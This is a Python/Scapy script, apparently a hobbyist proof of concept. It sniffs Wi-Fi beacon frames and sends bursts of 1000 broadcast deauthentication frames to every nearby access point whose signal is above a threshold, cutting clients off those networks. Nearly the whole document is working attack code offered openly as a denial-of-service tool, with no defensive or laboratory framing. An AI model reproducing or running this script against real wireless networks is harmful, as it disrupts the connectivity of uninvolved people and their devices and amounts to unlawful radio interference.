####Proof of concept script for Denial of Servicing wireless access points####
####This script will sniff Beacon frames and filter through them to decide whether to deauth them or not####
####Channel hopping and command line options will come soon####

#!/usr/bin/python2.7
#import sys
#sys.path.insert(0,"/home/matt/programming/python/modules/airodump-iv/airoiv")
#import scapy_ex
from scapy.all import * #Import scapy
#######################
AP = [] #List to store previously stored access point bssids

class packet_handler: #Packet handler class
	def __init__(self, pkt): #Class constructor that is called by the sniff function in main
    		try:
    			self.packet_parser(pkt) #Call the packet_parser function to start.
		except:
			pass
	def send_frame(self, essid, bssid):
		try:
			print "Deauthentication packet sent to %s on Access point %s : ESSID %s" % ("FF:FF:FF:FF:FF:FF", bssid, essid)
			packet = RadioTap()/ Dot11(addr1 = "FF:FF:FF:FF:FF:FF", addr2 = bssid, addr3 = bssid)/ Dot11Deauth() #Constructing the deauth packet.
			sendp(packet, iface = "mon0", count = 1000, inter = 0) #Send deauthentication frames via layer 2.
		except KeyboardInterrupt:
			exit(0)

	def packet_filter(self, essid, bssid, sig_str): #Second function to be used
		if len(AP) > 5: #Check if the AP has more than five entries.
			print "list too long" 
			AP[:] = [] #If list has more than five entries flush it.
		if sig_str > -80 and bssid not in AP: #Check if bssid is in previosuly used list and if the singal strength is strong enough(specifying list length and signal strength will be in CLI options later)
			AP.append(bssid) #Add bssid to AP list
			self.send_frame(essid, bssid) #Call the send_frame function to start deauth.
			

	def packet_parser(self, pkt): #First function to be used in the class.
		essid = pkt.getlayer(Dot11Elt).info #Identify the essid of the packet
		bssid = pkt.getlayer(Dot11).addr2 #Identify the bssid of the packet
		sig_str = -(256-ord(pkt.notdecoded[-4:-3]))#Identify the signal strength of the packet
		self.packet_filter(essid, bssid, sig_str)#Call the packet_filter function and passing the three new variables

def main():
	sniff(prn = packet_handler, lfilter = lambda x: x.haslayer(Dot11Beacon), iface = "mon0", store = 0) #Sniff packets from the air, filtering them by Beacon frames and passing them to the packet_handler class.

if __name__ == '__main__':
	main()
